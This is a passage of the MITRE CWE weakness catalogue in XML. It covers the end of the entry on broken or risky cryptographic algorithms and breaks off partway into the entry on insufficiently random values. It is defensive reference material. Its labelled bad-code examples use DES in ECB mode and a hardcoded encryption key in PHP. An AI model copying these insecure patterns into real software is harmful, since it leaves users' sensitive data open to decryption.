               <Consequence_Scope>Accountability</Consequence_Scope>
               <Consequence_Scope>Non-Repudiation</Consequence_Scope>
               <Consequence_Technical_Impact>Hide activities</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>If the cryptographic algorithm is used to ensure the identity of the
							source of the data (such as digital signatures), then a broken algorithm
							will compromise this scheme and the source of the data cannot be
							proven.</Text>
               </Consequence_Note>
            </Common_Consequence>
         </Common_Consequences>
         <Detection_Methods>
            <Detection_Method>
               <Method_Name>Automated Analysis</Method_Name>
               <Method_Description>
                  <Text>Automated methods may be useful for recognizing commonly-used
							libraries or features that have become obsolete.</Text>
               </Method_Description>
               <Method_Effectiveness>Moderate</Method_Effectiveness>
               <Method_Effectiveness_Notes>
                  <Text>False negatives may occur if the tool is not aware of the
							cryptographic libraries in use, or if custom cryptography is being
							used.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method Detection_Method_ID="DM-7">
               <Method_Name>Manual Analysis</Method_Name>
               <Method_Description>
                  <Text>This weakness can be detected using tools and techniques that require
							manual (human) analysis, such as penetration testing, threat modeling,
							and interactive tools that allow the tester to record and modify an
							active session. </Text>
               </Method_Description>
               <Method_Effectiveness_Notes>
                  <Text> These may be more effective than strictly automated techniques. This
							is especially the case with weaknesses that are related to design and
							business rules.</Text>
               </Method_Effectiveness_Notes>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Bytecode Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary Weakness Analysis - including disassembler + source
									code weakness analysis</Text>
                        <Text>Binary / Bytecode simple extractor – strings, ELF readers,
									etc.</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Binary / Bytecode</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Binary / Bytecode disassembler - then use manual analysis for
									vulnerabilities &amp; anomalies</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with automated results
						interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Web Application Scanner</Text>
                        <Text>Web Services Scanner</Text>
                        <Text>Database Scanners</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Dynamic Analysis with manual results interpretation</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Man-in-the-middle attack tool</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Framework-based Fuzzer</Text>
                        <Text>Automated Monitored Execution</Text>
                        <Text>Monitored Virtual Environment - run potentially malicious code
									in sandbox / wrapper / virtual machine, see if it does anything
									suspicious</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Manual Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Manual Source Code Review (not inspections)</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Focused Manual Spotcheck - Focused manual analysis of
									source</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis - Source Code</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Source code Weakness Analyzer</Text>
                        <Text>Context-configured Source Code Weakness Analyzer</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Automated Static Analysis</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Configuration Checker</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR Partial</Method_Effectiveness>
            </Detection_Method>
            <Detection_Method>
               <Method_Name>Architecture / Design Review</Method_Name>
               <Method_Description>
                  <Text>According to SOAR, the following detection techniques may be
							useful:</Text>
                  <Block>
                     <Text>Highly cost effective:</Text>
                     <Block Block_Nature="List">
                        <Text>Formal Methods / Correct-By-Construction</Text>
                     </Block>
                     <Text>Cost effective for partial coverage:</Text>
                     <Block Block_Nature="List">
                        <Text>Inspection (IEEE 1028 standard) (can apply to requirements,
									design, source code, etc.)</Text>
                     </Block>
                  </Block>
               </Method_Description>
               <Method_Effectiveness>SOAR High</Method_Effectiveness>
            </Detection_Method>
         </Detection_Methods>
         <Potential_Mitigations>
            <Mitigation Mitigation_ID="MIT-24">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>When there is a need to store or transmit sensitive data, use strong,
							up-to-date cryptographic algorithms to encrypt that data. Select a
							well-vetted algorithm that is currently considered to be strong by
							experts in the field, and use well-tested implementations. As with all
							cryptographic mechanisms, the source code should be available for
							analysis.</Text>
                  <Text>For example, US government systems require FIPS 140-2
							certification.</Text>
                  <Text>Do not develop custom or private cryptographic algorithms. They will
							likely be exposed to attacks that are well-understood by cryptographers.
							Reverse engineering techniques are mature. If the algorithm can be
							compromised if attackers find out how it works, then it is especially
							weak.</Text>
                  <Text>Periodically ensure that the cryptography has not become obsolete.
							Some older algorithms, once thought to require a billion years of
							computing time, can now be broken in days or hours. This includes MD4,
							MD5, SHA1, DES, and other algorithms that were once regarded as strong.
							[R.327.4]</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Design the software so that one cryptographic algorithm can be
							replaced with another. This will make it easier to upgrade to stronger
							algorithms.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>Carefully manage and protect cryptographic keys (see CWE-320). If the
							keys can be guessed or stolen, then the strength of the cryptography
							itself is irrelevant.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-4">
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Strategy>Libraries or Frameworks</Mitigation_Strategy>
               <Mitigation_Description>
                  <Text>Use a vetted library or framework that does not allow this weakness to
							occur or provides constructs that make this weakness easier to
							avoid.</Text>
                  <Text>Industry-standard implementations will save development time and may
							be more likely to avoid errors that can occur during implementation of
							cryptographic algorithms. Consider the ESAPI Encryption feature.</Text>
               </Mitigation_Description>
            </Mitigation>
            <Mitigation Mitigation_ID="MIT-25">
               <Mitigation_Phase>Implementation</Mitigation_Phase>
               <Mitigation_Phase>Architecture and Design</Mitigation_Phase>
               <Mitigation_Description>
                  <Text>When using industry-approved techniques, use them correctly. Don't cut
							corners by skipping resource-intensive steps (CWE-325). These steps are
							often essential for preventing common attacks.</Text>
               </Mitigation_Description>
            </Mitigation>
         </Potential_Mitigations>
         <Demonstrative_Examples>
            <Demonstrative_Example>
               <Intro_Text>These code examples use the Data Encryption Standard
						(DES).</Intro_Text>
               <Example_Body>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>C</Code_Example_Language>
                     <Code_Example_Language>C++</Code_Example_Language>
                     <Code>EVP_des_ecb();</Code>
                  </Block>
                  <Text/>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>Java</Code_Example_Language>
                     <Code>Cipher des=Cipher.getInstance("DES...");</Code>
                     <Code>des.initEncrypt(key2);</Code>
                  </Block>
                  <Block Block_Nature="Bad_Code">
                     <Code_Example_Language>PHP</Code_Example_Language>
                     <Code> function encryptPassword($password){</Code>
                     <Block>
                        <Code> $iv_size = mcrypt_get_iv_size(MCRYPT_DES,
									MCRYPT_MODE_ECB);</Code>
                        <Code> $iv = mcrypt_create_iv($iv_size, MCRYPT_RAND);</Code>
                        <Code> $key = "This is a password encryption key";</Code>
                        <Code> $encryptedPassword = mcrypt_encrypt(MCRYPT_DES, $key,
									$password, MCRYPT_MODE_ECB, $iv);</Code>
                        <Code> return $encryptedPassword;</Code>
                     </Block>
                     <Code>}</Code>
                  </Block>
                  <Text> Once considered a strong algorithm, DES now regarded as insufficient
							for many applications. It has been replaced by Advanced Encryption
							Standard (AES).</Text>
               </Example_Body>
            </Demonstrative_Example>
         </Demonstrative_Examples>
         <Observed_Examples>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3775</Observed_Example_Reference>
               <Observed_Example_Description>Product uses "ROT-25" to obfuscate the password in
						the registry.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-4150</Observed_Example_Reference>
               <Observed_Example_Description>product only uses "XOR" to obfuscate sensitive
						data</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-5460</Observed_Example_Reference>
               <Observed_Example_Description>product only uses "XOR" and a fixed key to
						obfuscate sensitive data</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-4860</Observed_Example_Reference>
               <Observed_Example_Description>Product substitutes characters with other
						characters in a fixed way, and also leaves certain input characters
						unchanged.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2002-2058</Observed_Example_Reference>
               <Observed_Example_Description>Attackers can infer private IP addresses by
						dividing each octet by the MD5 hash of '20'.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2008-3188</Observed_Example_Reference>
               <Observed_Example_Description>Product uses DES when MD5 has been specified in
						the configuration, resulting in weaker-than-expected password
						hashes.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2005-2946</Observed_Example_Reference>
               <Observed_Example_Description>Default configuration of product uses MD5 instead
						of stronger algorithms that are available, simplifying forgery of
						certificates.</Observed_Example_Description>
            </Observed_Example>
            <Observed_Example>
               <Observed_Example_Reference>CVE-2007-6013</Observed_Example_Reference>
               <Observed_Example_Description>Product uses the hash of a hash for
						authentication, allowing attackers to gain privileges if they can obtain the
						original hash.</Observed_Example_Description>
            </Observed_Example>
         </Observed_Examples>
         <References>
            <Reference Reference_ID="REF-6" Local_Reference_ID="R.327.1">
               <Reference_Author>Bruce Schneier</Reference_Author>
               <Reference_Title>Applied Cryptography</Reference_Title>
               <Reference_Publisher>John Wiley &amp; Sons</Reference_Publisher>
               <Reference_PubDate>1996</Reference_PubDate>
               <Reference_Link>http://www.schneier.com/book-applied.html</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.327.2">
               <Reference_Author>Alfred J. Menezes</Reference_Author>
               <Reference_Author>Paul C. van Oorschot</Reference_Author>
               <Reference_Author>Scott A. Vanstone</Reference_Author>
               <Reference_Title>Handbook of Applied Cryptography</Reference_Title>
               <Reference_PubDate>October 1996</Reference_PubDate>
               <Reference_Link>http://www.cacr.math.uwaterloo.ca/hac/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-10" Local_Reference_ID="R.327.3">
               <Reference_Author>C Matthew Curtin</Reference_Author>
               <Reference_Title>Avoiding bogus encryption products: Snake Oil
						FAQ</Reference_Title>
               <Reference_Date>1998-04-10</Reference_Date>
               <Reference_Link>http://www.faqs.org/faqs/cryptography-faq/snake-oil/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-1" Local_Reference_ID="R.327.4">
               <Reference_Author>Information Technology Laboratory, National Institute of
						Standards and Technology</Reference_Author>
               <Reference_Title>SECURITY REQUIREMENTS FOR CRYPTOGRAPHIC
						MODULES</Reference_Title>
               <Reference_Date>2001-05-25</Reference_Date>
               <Reference_Link>http://csrc.nist.gov/publications/fips/fips140-2/fips1402.pdf</Reference_Link>
            </Reference>
            <Reference Local_Reference_ID="R.327.5">
               <Reference_Author>Paul F. Roberts</Reference_Author>
               <Reference_Title>Microsoft Scraps Old Encryption in New Code</Reference_Title>
               <Reference_Date>2005-09-15</Reference_Date>
               <Reference_Link>http://www.eweek.com/c/a/Security/Microsoft-Scraps-Old-Encryption-in-New-Code/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-11" Local_Reference_ID="R.327.6">
               <Reference_Author>M. Howard</Reference_Author>
               <Reference_Author>D. LeBlanc</Reference_Author>
               <Reference_Title>Writing Secure Code</Reference_Title>
               <Reference_Section>Chapter 8, "Cryptographic Foibles" Page
						259</Reference_Section>
               <Reference_Edition>2nd Edition</Reference_Edition>
               <Reference_Publisher>Microsoft</Reference_Publisher>
               <Reference_PubDate>2002</Reference_PubDate>
            </Reference>
            <Reference Reference_ID="REF-17" Local_Reference_ID="R.327.7">
               <Reference_Author>Michael Howard</Reference_Author>
               <Reference_Author>David LeBlanc</Reference_Author>
               <Reference_Author>John Viega</Reference_Author>
               <Reference_Title>24 Deadly Sins of Software Security</Reference_Title>
               <Reference_Section>"Sin 21: Using the Wrong Cryptography." Page
						315</Reference_Section>
               <Reference_Publication>McGraw-Hill</Reference_Publication>
               <Reference_PubDate>2010</Reference_PubDate>
            </Reference>
            <Reference Local_Reference_ID="R.327.8">
               <Reference_Author>Johannes Ullrich</Reference_Author>
               <Reference_Title>Top 25 Series - Rank 24 - Use of a Broken or Risky
						Cryptographic Algorithm</Reference_Title>
               <Reference_Publisher>SANS Software Security Institute</Reference_Publisher>
               <Reference_Date>2010-03-25</Reference_Date>
               <Reference_Link>http://blogs.sans.org/appsecstreetfighter/2010/03/25/top-25-series-rank-24-use-of-a-broken-or-risky-cryptographic-algorithm/</Reference_Link>
            </Reference>
            <Reference Reference_ID="REF-7" Local_Reference_ID="R.327.9">
               <Reference_Author>Mark Dowd</Reference_Author>
               <Reference_Author>John McDonald</Reference_Author>
               <Reference_Author>Justin Schuh</Reference_Author>
               <Reference_Title>The Art of Software Security Assessment</Reference_Title>
               <Reference_Section>Chapter 2, "Insufficient or Obsolete Encryption", Page
						44.</Reference_Section>
               <Reference_Edition>1st Edition</Reference_Edition>
               <Reference_Publisher>Addison Wesley</Reference_Publisher>
               <Reference_PubDate>2006</Reference_PubDate>
            </Reference>
         </References>
         <Taxonomy_Mappings>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CLASP">
               <Mapped_Node_Name>Using a broken or risky cryptographic
						algorithm</Mapped_Node_Name>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="OWASP Top Ten 2004">
               <Mapped_Node_Name>Insecure Storage</Mapped_Node_Name>
               <Mapped_Node_ID>A8</Mapped_Node_ID>
               <Mapping_Fit>CWE_More_Specific</Mapping_Fit>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT Java Secure Coding">
               <Mapped_Node_Name>Generate strong random numbers</Mapped_Node_Name>
               <Mapped_Node_ID>MSC02-J</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Do not use the rand() function for generating pseudorandom
						numbers</Mapped_Node_Name>
               <Mapped_Node_ID>MSC30-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
            <Taxonomy_Mapping Mapped_Taxonomy_Name="CERT C++ Secure Coding">
               <Mapped_Node_Name>Ensure your random number generator is properly
						seeded</Mapped_Node_Name>
               <Mapped_Node_ID>MSC32-CPP</Mapped_Node_ID>
            </Taxonomy_Mapping>
         </Taxonomy_Mappings>
         <Related_Attack_Patterns>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>20</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>459</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>473</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>608</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>614</CAPEC_ID>
            </Related_Attack_Pattern>
            <Related_Attack_Pattern CAPEC_Version="2.9">
               <CAPEC_ID>97</CAPEC_ID>
            </Related_Attack_Pattern>
         </Related_Attack_Patterns>
         <Content_History>
            <Submission Submission_Source="Externally_Mined">
               <Submitter>CLASP</Submitter>
            </Submission>
            <Modification Modification_Source="External">
               <Modifier_Organization>Veracode</Modifier_Organization>
               <Modification_Date>2008-08-15</Modification_Date>
               <Modification_Comment>Suggested OWASP Top Ten 2004
						mapping</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2008-09-08</Modification_Date>
               <Modification_Comment>updated Background_Details, Common_Consequences,
						Description, Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-01-12</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Description,
						Observed_Examples, Potential_Mitigations, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-03-10</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-07-27</Modification_Date>
               <Modification_Comment>updated Maintenance_Notes,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-10-29</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2009-12-28</Modification_Date>
               <Modification_Comment>updated References</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-02-16</Modification_Date>
               <Modification_Comment>updated Detection_Factors, References,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-04-05</Modification_Date>
               <Modification_Comment>updated Applicable_Platforms, Potential_Mitigations,
						Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-06-21</Modification_Date>
               <Modification_Comment>updated Common_Consequences, Detection_Factors,
						Potential_Mitigations, References, Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2010-09-27</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-03-29</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples,
						Description</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-01</Modification_Date>
               <Modification_Comment>updated Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-06-27</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2011-09-13</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations, Relationships,
						Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-05-11</Modification_Date>
               <Modification_Comment>updated References, Related_Attack_Patterns,
						Relationships, Taxonomy_Mappings</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2012-10-30</Modification_Date>
               <Modification_Comment>updated Potential_Mitigations</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2013-02-21</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-02-18</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-06-23</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2014-07-30</Modification_Date>
               <Modification_Comment>updated Demonstrative_Examples, Detection_Factors,
						Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2015-12-07</Modification_Date>
               <Modification_Comment>updated Relationships</Modification_Comment>
            </Modification>
            <Modification Modification_Source="Internal">
               <Modifier>CWE Content Team</Modifier>
               <Modifier_Organization>MITRE</Modifier_Organization>
               <Modification_Date>2017-01-19</Modification_Date>
               <Modification_Comment>updated Related_Attack_Patterns</Modification_Comment>
            </Modification>
            <Previous_Entry_Names>
               <Previous_Entry_Name Name_Change_Date="2008-04-11">Using a Broken or Risky
						Cryptographic Algorithm</Previous_Entry_Name>
            </Previous_Entry_Names>
         </Content_History>
      </Weakness>
                    <Weakness ID="330" Name="Use of Insufficiently Random Values" Weakness_Abstraction="Class" Status="Usable">
         <Description>
            <Description_Summary>The software may use insufficiently random numbers or values in
					a security context that depends on unpredictable numbers.</Description_Summary>
            <Extended_Description>
               <Text>When software generates predictable values in a context requiring
						unpredictability, it may be possible for an attacker to guess the next value
						that will be generated, and use this guess to impersonate another user or
						access sensitive information.</Text>
            </Extended_Description>
         </Description>
         <Relationships>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">900</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>867</Relationship_Target_ID>
               <!--2011 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">800</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>808</Relationship_Target_ID>
               <!--2010 Top 25 - Weaknesses On the Cusp--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">700</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">699</Relationship_View_ID>
                  <Relationship_View_ID Ordinal="Primary">1003</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>254</Relationship_Target_ID>
               <!--Security Features--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">711</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>723</Relationship_Target_ID>
               <!--OWASP Top Ten 2004 Category A2 - Broken Access Control--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">734</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>747</Relationship_Target_ID>
               <!--CERT C Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">750</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>753</Relationship_Target_ID>
               <!--2009 Top 25 - Porous Defenses--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">844</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>861</Relationship_Target_ID>
               <!--CERT Java Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">868</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>883</Relationship_Target_ID>
               <!--CERT C++ Secure Coding Section 49 - Miscellaneous (MSC)--></Relationship>
            <Relationship>
               <Relationship_Views>
                  <Relationship_View_ID Ordinal="Primary">888</Relationship_View_ID>
               </Relationship_Views>
               <Relationship_Target_Form>Category</Relationship_Target_Form>
               <Relationship_Nature>ChildOf</Relationship_Nature>
               <Relationship_Target_ID>905</Relationship_Target_ID>
               <!--SFP Primary Cluster: Predictability--></Relationship>
         </Relationships>
         <Relationship_Notes>
            <Relationship_Note>
               <Text>This can be primary to many other weaknesses such as cryptographic errors,
						authentication errors, symlink following, information leaks, and
						others.</Text>
            </Relationship_Note>
         </Relationship_Notes>
         <Weakness_Ordinalities>
            <Weakness_Ordinality>
               <Ordinality>Primary</Ordinality>
            </Weakness_Ordinality>
         </Weakness_Ordinalities>
         <Applicable_Platforms>
            <Languages>
               <Language_Class Language_Class_Description="Language-independent"/>
            </Languages>
         </Applicable_Platforms>
         <Background_Details>
            <Background_Detail>
               <Text>Computers are deterministic machines, and as such are unable to produce
						true randomness. Pseudo-Random Number Generators (PRNGs) approximate
						randomness algorithmically, starting with a seed from which subsequent
						values are calculated. There are two types of PRNGs: statistical and
						cryptographic. Statistical PRNGs provide useful statistical properties, but
						their output is highly predictable and forms an easy to reproduce numeric
						stream that is unsuitable for use in cases where security depends on
						generated values being unpredictable. Cryptographic PRNGs address this
						problem by generating output that is more difficult to predict. For a value
						to be cryptographically secure, it must be impossible or highly improbable
						for an attacker to distinguish between it and a truly random value.</Text>
            </Background_Detail>
         </Background_Details>
         <Time_of_Introduction>
            <Introductory_Phase>Architecture and Design</Introductory_Phase>
            <Introductory_Phase>Implementation</Introductory_Phase>
         </Time_of_Introduction>
         <Likelihood_of_Exploit>Medium to High</Likelihood_of_Exploit>
         <Common_Consequences>
            <Common_Consequence>
               <Consequence_Scope>Confidentiality</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Other</Consequence_Technical_Impact>
               <Consequence_Note>
                  <Text>When a protection mechanism relies on random values to restrict access
							to a sensitive resource, such as a session ID or a seed for generating a
							cryptographic key, then the resource being protected could be accessed
							by guessing the ID or key.</Text>
               </Consequence_Note>
            </Common_Consequence>
            <Common_Consequence>
               <Consequence_Scope>Access_Control</Consequence_Scope>
               <Consequence_Scope>Other</Consequence_Scope>
               <Consequence_Technical_Impact>Bypass protection
						mechanism</Consequence_Technical_Impact>
